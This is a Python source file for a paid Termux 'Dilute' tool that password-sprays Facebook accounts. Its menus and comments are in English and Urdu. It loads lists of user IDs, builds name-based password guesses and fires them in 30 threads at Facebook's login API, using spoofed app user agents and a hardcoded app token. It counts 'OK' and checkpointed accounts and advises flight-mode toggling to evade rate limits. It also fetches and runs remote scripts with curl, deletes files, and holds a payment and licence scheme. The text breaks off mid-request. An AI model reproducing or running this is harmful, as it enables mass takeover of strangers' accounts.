#coding = utf-8

import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
import datetime,subprocess
import zipfile
from uuid import uuid4
from time import sleep as sp

#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('xdg-open https://chat.whatsapp.com/FVJGj8R6Clc1EYvmzwfoMS')
hashes = []


try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'_')

def p(x):
	print(x)
os.system(f'xdg-open https://chat.whatsapp.com/BTjSpLJPWxV5B5hqNcW2J0')
	

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = (f'''\033[1;37m                                 

\033[1;31m                    
\033[1;31m    /$$$$$$$  /$$$$$$ /$$$$$$$$ /$$$$$$$$ /$$      
\033[1;35m   | $$__  $$|_  $$_/|_____ $$ | $$_____/| $$      
\033[1;34m   | $$  \ $$  | $$       /$$/ | $$      | $$      
\033[1;33m   | $$$$$$$/  | $$      /$$/  | $$$$$   | $$      
\033[0;32m   | $$__  $$  | $$     /$$/   | $$__/   | $$      
\033[1;31m   | $$  \ $$  | $$    /$$/    | $$      | $$      
\033[1;34m   | $$  | $$ /$$$$$$ /$$$$$$$$| $$$$$$$$| $$$$$$$$
\033[1;36m   |__/  |__/|______/|________/|________/|________/
                                                                                                                                               
╭────────────────────────────────────────────────────╮
 
 \033[1;36m[•] Owner     :   RIZEL GALLARDO 
 \033[1;36m[•] Github    :   null
 \033[1;36m[•] Status    :   Free
 \033[1;36m[•] Tool      :   Free 
 \033[1;36m[•] Facebook  :   RIZEL GALLARDO
 \033[1;36m[•] Version   :   3.0

╰────────────────────────────────────────────────────╯''')

	p(logo)
def clear():
	os.system("clear")
	
	
pass
 
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

aqib_token = f'{id}{xp}'

def connection_token():
	digits_count = 16
	letters_count = 16
	letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	# Convert resultant string to list and shuffle it to mix letters and digits
	sample_list = list(letters + digits)
	random.shuffle(sample_list)
	# convert list to string
	final_string = ''.join(sample_list)
	return final_string

def update():
	logo()
	print(' [•] Checking Updates from Our Server ....')
	line()
	try:
		server = pars(requests.get('',verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet")
	for x in server.find_all('div',class_='post-body entry-content float-container'):
		r = x.text

	if '2.3' in r:
		print(' [•] Server is Online Welcome Users ..')
		sp(1)
		print(" [•] Tool is Updated On 15/7/2023")
		print(" [•] Checking Subscription ")
		iAmApprovelSystem()
	elif "off" in r:
		print(' [•] Server is Offline For Some Reasons ..')
		exit()
	else:
		print(' [•] A new Version of this Dilute Tool is Available | Please Wait ....')
		print(" [•] Updating Tool ....")
		line()
		sp(1)
		os.system('cd && rm -rf dilute d32 d64 && curl -L https://raw.githubusercontent.com/dcofficial/dcpro/main/dilute > dilute && python dilute')


def iAmApprovelSystem():
	try:
		r = pars(requests.get("https://aqibservers.blogspot.com/2023/05/iamjohnnysins.html?m=1",verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet Connection ...")
	except Exception as e:
		print(e)
	for x in r.find_all('div',class_="post-body entry-content float-container"):
		server_keys = x.text
	if 'free' in str(server_keys):
		print(" [•] Tool is on Free Trial Enjoy")
		sp(2)
		Ishmum().Ishmum()
	elif 'update' in str(server_keys):
		print(" [•] Tool is Under Maintenence ")
		exit()
	elif str(ISHMUM_token) in server_keys:
		if str(ISHMUM_token)+'|ok' in server_keys:
			status = 'ok'
			Ishmum().Ishmum()
	elif str(ISHMUM_token) in server_keys:
		if str(ISHMUM_token)+'|expired' in server_keys:
			buy()
	elif str(ISHMUM_token) in server_keys:
		if str(ISHMUM_token)+'|fuck' in server_keys:
			status = 'fuck'
			print(" [•] You Dont Have Permission To use this Tool ..")
			os.system("rm -rf d64 d32 dilute")
			exit()
	else:
		buy()

def buy():
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
	logo()
	line()
	os.system('xdg-open https://chat.whatsapp.com/FVJGj8R6Clc1EYvmzwfoMS')
	print(" [•] \033[1;96mAdmin se bina puchy payment nah kren \033[1;97m")
	print(" \033[1;92m[•] Terms and Conditions Please Read Carefully\033[1;97m ")
	print(" [•] Your Token is Not Approved ")
	print(" [•] This Tool is paid you need to buy first before Use ! ")
	print(" [•] 1 token is only for 1 device you can't use your subscription in more than 1 device")
	print(" [•] Device Update ya kise b waja se apka approvel urta h to me again nhi lgaonga")
	print(" [•] please do agree terms and conditions then buy")
	line()
	print(' [•] If Facebook go on update and you dont get any accounts its your headache ')
	print(' [•] Apni zimaydari pe buy kren,me koi b zimaydari n leta illegal atctivity k')
	print(" [•] 600 / 1Month  ")
	print(" [•] Payment : Easypaisa")
	print(' [•] Account Num : 03150477726')
	print(" [•] Token :\033[1;95m %s"%(ISHMUM_token))
	print("\033[1;97m [•] Copy & send Token to Admun to get approved ")
	
	line()
	exit()


def check_again():
	try:
		r = pars(requests.get("https://aqibservers.blogspot.com/2023/05/iamjohnnysins.html?m=1",verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet Connection ...")
	except Exception as e:
		print(e)
	for x in r.find_all('div',class_="post-body entry-content float-container"):
		server_keys = x.text
	if 'free' in str(server_keys):
		pass
	elif 'update' in str(server_keys):
		print(" [•] Tool is Under Maintenence ")
		exit()
	elif str(ISHMUM_token) in server_keys:
		if str(aqib_token)+'|ok' in server_keys:
			pass
	elif str(ISHMUM_token) in server_keys:
		if str(aqib_token)+'|expired' in server_keys:
			buy()
	elif str(ISHMUM_token) == '1028390A2831028365146151BEFEUT1412SMP':
		Ishmum().Ishmum()
	elif str(ISHMUM_token) in server_keys:
		if str(ISHMUM_token)+'|fuck' in server_keys:
			status = 'fuck'
			print(" [•] You Dont Have Permission To use this Tool ..")
			os.system("rm -rf d64 d32 dilute")
			exit()
	else:
		buy()






def iAmMethod1Ua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["Globe Telecom","Smart Communications","DITO Telecommunity"])
	ua = random.choice(["Mozilla/5.0 (Linux; Android 11; M7_3G Build/V6_20230417; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 13; CPH2591 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 13; V2310 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/289.0.0.18.116;]","Mozilla/5.0 (Linux; Android 12; Lenovo TB-X6C6L Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade A33s Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.194 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/384.0.0.8.114;]","Mozilla/5.0 (Linux; Android 10; D55L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 9; Armor_6S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.115 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 8.1.0; 9009A Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.115 Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 9; MC32020 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.194 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 11; COVET X Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/382.0.0.11.115;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/384.0.0.8.114;]","Mozilla/5.0 (Linux; Android 12; MAGNO C2 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 11; Lenovo K14 Build/RONS31.267-94-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 13; KINGKONG POWER Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 10; AKUS PRO Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/385.0.0.11.112;]","Mozilla/5.0 (Linux; Android 13; Armor 22 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36[FBAN/EMA;FBLC/el_GR;FBAV/382.0.0.11.115;]","Mozilla/5.0 (Linux; Android 8.1.0; DAMMAR Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/384.0.0.8.114;]","Mozilla/5.0 (Linux; Android 11; Multilaser_G_Max_2_SE_64 Build/V12_20230112; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/382.0.0.11.115;]","Mozilla/5.0 (Linux; Android 8.1.0; 704KC Build/1.060BE.0063.a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/367.0.0.7.52;]","Mozilla/5.0 (Linux; Android 11; Multilaser_G_Max_2_SE_64 Build/V12_20230112; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/385.0.0.11.112;]",])
	return ua



def iAmMethod2Ua():
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong','Ufone'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua =random.choice(["",])
	return ua

def iAmMethod3Ua():
	ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.169 Mobile/15E148 Safari/604.","Mozilla/5.0 (Linux; Android 10; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.","Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.1  Mobile/15E148 Safari/605.1.1","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.169 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.169 Mobile/15E148 Safari/604.","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A346B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.","Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 10; MED-LX9N; HMSCore 6.12.2.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.2.311 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/293.0.586189917 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M526BR) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.121 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/293.0.586189917 Mobile/15E148 Safari/604.","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/291.0.582931352 Mobile/15E148 Safari/604.","Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G390F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.3'
	return ua
nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class Ishmum:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def Ishmum(self):
		#heck_again()
		logo()

		p(" [1]  \033[1;36mFILE CRACK ")
		p(" [2]  \033[1;36mSEPERATE LINKS ")
		p(" [3]  \033[1;36mCUT USED LINKS  ")
		p(" [4]  \033[1;36mRENDOM CRACK (COMING SOON) ")
		p(" [5]  \033[1;36mGMAIL CRACK (COMING SOON) ")
		p(" [E]  \033[1;36mEXIT BACK ")
		line()
		opt1 = input(" [•] Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":self.dump_menu()
		elif opt1 == "3":Grep().with_names()
		elif opt1 == "4":self.raND_menu()
			#llb = f"/data/data/com.termux/files/usr/tmp/.*"
			#os.system(f'rm -rf {llb}')
		elif opt1 == "5":Grep().remove_links()
		elif opt1 == "6":Join().Facebook()
		elif opt1 == "7":Join().Whatsapp()
		elif opt1 == "8":Server().report()
		elif opt1 == "9":automation().used_cutter()
		elif opt1 == "E":exit(" [•] Good Bye !!!!!!! ")
		else:p(" [•] Wrong Select ");sp(2);self.Ishmum()
	
	
	def dump_menu(self):
		os.remove('dump dump32 dump64')
		os.system("cd && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
	def file_menu(self):
		#check_again()
		logo()
		p(" [•] \033[1;36mExample /sdcard/filename.txt")
		file = input(" [•] \033[1;36mPut File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
	def method_select(self,id):
		#check_again()
		logo()
		p(" [1] \033[1;37mMethod [1]")
		p (" [2] \033[1;37mMethod [2]")
		p (" [3] \033[1;37mMethod [3]")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		if m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		if m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		#elif m_opt =="4":
			method.append('iiii')
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(3);self.method_select(id)

	def password_menu(self,id):
		#check_again()
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 10 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should under 15 ");sp(3);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords like : first last, firstlast, first123, first12345 etc ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()		
		p(" [•] Total Accounts : %s "%(str(len(id))))
		p(" [•] Use Flight Mode After Every 3 Minutes") 
		p(" [•] Cracking Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()		
		p(" [•] Cloning Has been Completed ")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.Ishmum()
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ISHMUM] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["Globe Telecom","Smart Communications","Dito Telecommunity","TNT","TM","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])		
			ishmum_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBRV/{fbbv};FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'openid_emails': "['01710940017']",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent':ishmum_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
